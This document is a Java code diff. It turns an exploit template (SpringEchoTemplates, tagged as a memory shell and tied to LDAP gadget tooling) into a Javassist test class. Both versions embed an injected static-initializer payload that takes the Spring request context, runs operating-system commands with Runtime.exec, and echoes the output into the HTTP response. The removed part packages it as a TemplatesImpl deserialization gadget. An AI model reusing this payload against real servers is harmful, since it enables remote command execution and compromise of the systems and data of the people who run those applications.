@@ -1,54 +1,40 @@
-package com.idiot9.ldap.templates;
+package com.idiot9.tmp;
 
-import com.idiot9.ldap.gadgets.utils.ClassFiles;
-import com.idiot9.ldap.gadgets.utils.Reflections;
-import com.idiot9.ldap.utils.Cache;
-import javassist.CannotCompileException;
-import javassist.ClassClassPath;
-import javassist.ClassPool;
-import javassist.CtClass;
-import org.springframework.web.context.WebApplicationContext;
-import org.springframework.web.servlet.handler.AbstractHandlerMapping;
+import javassist.*;
 
-import javax.xml.transform.Templates;
+import java.io.IOException;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Method;
 
-@MemShell
-public class SpringEchoTemplates implements TemplateFactory{
-    private String className;
-    private Templates templates;
-    private byte[] bytes;
-    private String head;
-
-    public SpringEchoTemplates(String head) throws Exception {
-        this.head = head;
-        this.className = "Exploit" + System.nanoTime();
-        createTemplatesImpl();
-    }
-
-    @Override
-    public void createTemplatesImpl() throws CannotCompileException, Exception {
-        Templates tpl = (Templates) tplClass.newInstance();
-
+public class JavassistTest {
+    public static void main(String[] args) throws CannotCompileException, NotFoundException, IOException {
         ClassPool pool = ClassPool.getDefault();
-        pool.insertClassPath(new ClassClassPath(TemplateFactory.StubTransletPayload.class));
-        pool.insertClassPath(new ClassClassPath(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class));
-        pool.insertClassPath(new ClassClassPath(AbstractHandlerMapping.class));
-        pool.insertClassPath(new ClassClassPath(WebApplicationContext.class));
-        pool.importPackage("com.sun.org.apache.xalan.internal.xsltc.runtime");
-        pool.importPackage("java.lang");
-        pool.importPackage("java.lang.reflect");
-        pool.importPackage("java.util");
-//        pool.importPackage("javax.servlet.http");
-//        pool.importPackage("javax.servlet");
-//        pool.importPackage("java.io");
-//        pool.importPackage("org.springframework.web.context.request");
+        CtClass ctClass = pool.makeClass("JavassistTest");
 
-        CtClass ctClass = pool.get(TemplateFactory.StubTransletPayload.class.getName());
+//        CtConstructor staticBlock = CtNewConstructor.make("static {}", ctClass);
+//        ctClass.addConstructor(staticBlock);
+        try {
+            java.lang.reflect.Method method = JavassistTest.getMethod("JavassistTest", "hello", new Class[]{String.class});
+            method.invoke(null, new Object[]{"hello"});
+        } catch (java.lang.Exception e) {
+        }
 
-        ctClass.setName(this.className);
+        String getMethod = "    private static java.lang.reflect.Method getMethod(java.lang.String className, java.lang.String methodName, java.lang.Class[] classes) throws java.lang.Exception {\n" +
+                "        java.lang.Class clazz = Class.forName(className);\n" +
+                "        java.lang.reflect.Method method = clazz.getDeclaredMethod(methodName, classes);\n" +
+                "        method.setAccessible(true);\n" +
+                "        return method;\n" +
+                "    }";
+
+//        ctClass.addMethod(CtNewMethod.make(getMethod, ctClass));
+
+        String hello = "public static void hello(String name){\n" +
+                "        System.out.println(\"hello\");\n" +
+                "    }";
+
+//        ctClass.addMethod(CtNewMethod.make(hello, ctClass));
 
         String static_block = "try {\n" +
-                "            java.lang.System.out.println(\"start spring echo\");\n" +
                 "            java.lang.Class c = java.lang.Thread.currentThread().getContextClassLoader().loadClass(\"org.springframework.web.context.request.RequestContextHolder\");\n" +
                 "            java.lang.reflect.Method m = c.getMethod(\"getRequestAttributes\", null);\n" +
                 "            java.lang.Object o = m.invoke(null, null);\n" +
@@ -76,43 +62,22 @@ public class SpringEchoTemplates implements TemplateFactory{
                 "            writer.getClass().getDeclaredMethod(\"println\", new Class[]{java.lang.String.class}).invoke(writer, new Object[]{(new java.util.Scanner(java.lang.Runtime.getRuntime().exec(commands).getInputStream())).useDelimiter(\"\\\\A\").next()});\n" +
                 "            writer.getClass().getDeclaredMethod(\"flush\", null).invoke(writer, new Object[]{});\n" +
                 "            writer.getClass().getDeclaredMethod(\"close\", null).invoke(writer, new Object[]{});\n" +
-                "            java.lang.System.out.println(\"end spring echo\");\n" +
                 "        } catch (java.lang.Exception e) {\n" +
-                "            java.lang.System.out.println(\"spring echo error\");\n" +
                 "        }";
 
         ctClass.makeClassInitializer().insertAfter(static_block);
 
-
-        CtClass superClass = pool.get(abstTranslet.getName());
-        ctClass.setSuperclass(superClass);
-
-
-        byte[] classBytes = ctClass.toBytecode();
-        this.bytes = classBytes;
-
-
-
-        this.templates = TemplateFactory.loadBytes(this.bytes, tpl);
+        ctClass.writeFile();
     }
 
-    @Override
-    public String getClassName() {
-        return this.className;
+    public static void hello(String name){
+        System.out.println("hello");
     }
 
-    @Override
-    public Templates getTemplates() {
-        return this.templates;
-    }
-
-    @Override
-    public void cache() throws Exception {
-        Cache.set(this.className, this.bytes);
-    }
-
-    @Override
-    public byte[] getBytes() {
-        return this.bytes;
+    private static java.lang.reflect.Method getMethod(java.lang.String className, java.lang.String methodName, java.lang.Class[] classes) throws java.lang.Exception {
+        java.lang.Class clazz = Class.forName(className);
+        java.lang.reflect.Method method = clazz.getDeclaredMethod(methodName, classes);
+        method.setAccessible(true);
+        return method;
     }
 }
